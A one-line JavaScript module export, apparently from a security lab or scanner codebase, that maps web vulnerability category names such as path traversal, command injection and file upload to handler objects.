export const SERVER2A = { 'path-traversal': pathTraversal, cmdi, logic, 'info-disclosure': infoDisclosure, 'file-upload': fileUpload };
